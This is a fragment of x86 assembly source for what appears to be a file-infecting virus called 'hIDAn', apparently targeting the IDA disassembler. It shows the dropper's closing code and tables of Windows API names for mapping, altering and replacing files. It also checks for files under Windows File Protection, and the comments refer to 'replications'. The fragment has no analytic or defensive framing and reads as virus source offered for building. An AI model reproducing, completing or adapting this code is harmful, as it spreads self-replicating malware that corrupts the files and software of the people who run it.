        call    _MessageBoxA@16
        push    ebx
        call    _ExitProcess@4                  ;9x/Me does not send DLL_DETACH messages if ret here

        mov     eax, dword ptr [offset _RootNode]
        mov     eax, dword ptr [offset _netnode_value@4]
                                                ;force references into import table

;must be alphabetical order
;API names are not present in replications, only in dropper

krnnames        db      "CloseHandle"         , 0
                db      "CreateFileA"         , 0
                db      "CreateFileMappingA"  , 0
                db      "GetFileAttributesA"  , 0
                db      "GetFileSize"         , 0
                db      "GetFileTime"         , 0
                db      "GetTickCount"        , 0
                db      "LoadLibraryA"        , 0
                db      "MapViewOfFile"       , 0
                db      "MultiByteToWideChar" , 0
                db      "SetFileAttributesA"  , 0
                db      "SetFileTime"         , 0
                db      "UnmapViewOfFile"     , 0

sfcnames        db      "SfcIsFileProtected", 0

dllnames        db      "CloseHandle"        , 0
                db      "CreateFileA"        , 0
                db      "DeleteFileA"        , 0
                db      "GetFileAttributesA" , 0
                db      "GetTempFileNameA"   , 0
                db      "GetTickCount"       , 0
                db      "GlobalAlloc"        , 0
                db      "GlobalFree"         , 0
                db      "LoadLibraryA"       , 0
                db      "MoveFileA"          , 0
                db      "SetFileAttributesA" , 0
                db      "WriteFile"          , 0
                db      "lstrcatA"           , 0

regnames        db      "RegQueryValueA", 0

dllname         equ     "hidan"                 ;must be < 7 bytes long else code change

txttitle        db      "hIDAn", 0
txtbody         db      "Now run IDA ;)", 0

.code
        nop
end             _dropper
